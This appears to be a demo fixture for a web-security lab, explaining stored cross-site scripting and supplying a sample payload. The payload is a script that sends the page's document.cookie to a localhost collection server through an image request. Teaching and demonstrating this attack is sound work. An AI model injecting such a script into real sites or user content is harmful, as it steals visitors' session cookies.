This file will be included without any filtering into the page in the section "Stored XSS".

It is intended to simulate the situation where the attacker causes us to store their malicious code and we later display it to other users.

Typically this would be done by persisting the content in the database, for example in a comments section.

<script type="text/javascript">
    var img = new Image();
    var div = document.getElementById('page-top');

    img.onload = function() {
    div.appendChild(img);
    };

    img.src = 'http://localhost:8000/?cookie_data='+document.cookie;;
</script>
